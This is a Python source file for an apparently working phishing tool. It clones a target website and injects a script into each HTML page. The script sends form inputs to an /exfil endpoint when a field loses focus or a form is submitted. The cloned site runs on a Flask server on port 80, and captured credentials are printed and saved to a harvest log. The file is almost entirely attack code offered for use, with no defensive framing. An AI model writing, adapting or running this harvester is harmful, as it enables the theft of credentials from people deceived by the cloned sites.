import os
import threading
import logging
import sys
import time
import requests

# --- START COMPATIBILITY SHIM FOR PYTHON 3.13+ ---
try:
    import cgi
except ImportError:
    from types import ModuleType
    cgi = ModuleType("cgi")
    cgi.parse_header = lambda line: (line, {})
    sys.modules["cgi"] = cgi
# --- END COMPATIBILITY SHIM ---

from flask import Flask, request, send_from_directory
from pywebcopy import save_webpage
from rich.console import Console
from rich.panel import Panel

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

console = Console()
app = Flask(__name__)
BASE_CLONE_PATH = "/opt/davoid/clones"

@app.route('/exfil', methods=['POST'])
def exfil():
    try:
        data = request.form.to_dict()
        client_ip = request.remote_addr
        console.print(Panel(f"[bold red]CREDENTIALS HARVESTED[/bold red]\n[yellow]IP:[/yellow] {client_ip}\n[yellow]Data:[/yellow] {data}", title="Exfiltration Event", border_style="red"))
        
        if not os.path.exists("logs"): os.makedirs("logs")
        with open("logs/harvested.txt", "a") as f:
            f.write(f"--- {time.ctime()} | {client_ip} ---\n{data}\n\n")
        return "OK", 200
    except Exception as e:
        return str(e), 500

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve_clone(path):
    directory = os.getcwd()
    # If path is empty or a directory, try to serve index.html
    if path == "" or os.path.isdir(os.path.join(directory, path)):
        return send_from_directory(directory, 'index.html')
    return send_from_directory(directory, path)

def run_server():
    try:
        app.run(host='0.0.0.0', port=80, debug=False, threaded=True)
    except Exception as e:
        console.print(f"[bold red][!] Server Failure: {e}[/bold red]")

def inject_hook(directory):
    """Deep search for any HTML file and inject the harvester hook."""
    hook = """
    <script>
    (function() {
        const logExfil = () => {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                const formData = new FormData(form);
                let hasData = false;
                for (let v of formData.values()) { if(v) hasData = true; }
                if (hasData) {
                    fetch('/exfil', { method: 'POST', body: formData });
                }
            });
        };
        document.querySelectorAll('input').forEach(i => i.addEventListener('blur', logExfil));
        document.querySelectorAll('form').forEach(f => f.addEventListener('submit', logExfil));
    })();
    </script>
    """
    found = False
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".html"):
                target_path = os.path.join(root, file)
                try:
                    with open(target_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    if "</body>" in content:
                        content = content.replace("</body>", f"{hook}</body>")
                    else:
                        content += hook
                    with open(target_path, "w", encoding="utf-8") as f:
                        f.write(content)
                    found = True
                except: continue
    return found

def clone_site():
    if os.getuid() != 0:
        return console.print("[red][!] Error: Root privileges required for Port 80.[/red]")

    draw_header("Site Cloner & Harvester")
    target_url = console.input("[bold yellow]Target URL: [/bold yellow]").strip()
    project_name = console.input("[bold yellow]Project Name: [/bold yellow]").strip()

    full_project_path = os.path.join(BASE_CLONE_PATH, project_name)
    if not os.path.exists(full_project_path):
        os.makedirs(full_project_path)

    console.print(f"[*] Attempting to clone: {target_url}")

    try:
        # Configuration to handle the browser warning and missing cgi
        save_webpage(
            url=target_url,
            project_folder=BASE_CLONE_PATH,
            project_name=project_name,
            bypass_robots=True,
            debug=False,
            open_in_browser=False # Fixes the UserWarning
        )
    except Exception as e:
        console.print(f"[red][!] PyWebCopy failed: {e}[/red]")

    # FALLBACK: If index.html is missing, manually pull the home page
    # PyWebCopy often nests things inside a folder named after the URL
    domain_folder = target_url.replace("https://", "").replace("http://", "").split('/')[0]
    potential_index_dir = os.path.join(full_project_path, domain_folder)
    
    # Check if the folder exists, if not, create it for manual fallback
    if not os.path.exists(potential_index_dir):
        os.makedirs(potential_index_dir)

    index_file = os.path.join(potential_index_dir, "index.html")
    
    if not os.path.exists(index_file):
        console.print("[yellow][!] Index not found. Attempting manual recovery...[/yellow]")
        try:
            r = requests.get(target_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            with open(index_file, "w", encoding="utf-8") as f:
                f.write(r.text)
            console.print("[green][+] Manual recovery successful.[/green]")
        except Exception as e:
            return console.print(f"[red][!] Critical failure: {e}[/red]")

    # Inject into all found HTML files
    if inject_hook(full_project_path):
        console.print("[green][+] Harvester hook injected successfully.[/green]")
    else:
        return console.print("[red][!] Failed to inject hook into any HTML files.[/red]")

    if console.input("\n[bold cyan]Start Harvest Server? (y/N): [/bold cyan]").lower() == 'y':
        # Change directory to where index.html actually is
        os.chdir(potential_index_dir)
        threading.Thread(target=run_server, daemon=True).start()
        
        console.print(Panel(f"Portal active: [bold green]http://{requests.get('https://api.ipify.org').text}[/bold green]\nTargeting: {target_url}", title="Success", border_style="green"))
        
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            console.print("\n[yellow][-] Server stopped.[/yellow]")

def draw_header(title):
    console.print(Panel(f"[bold white]{title}[/bold white]", expand=False, border_style="cyan"))

if __name__ == "__main__":
    clone_site()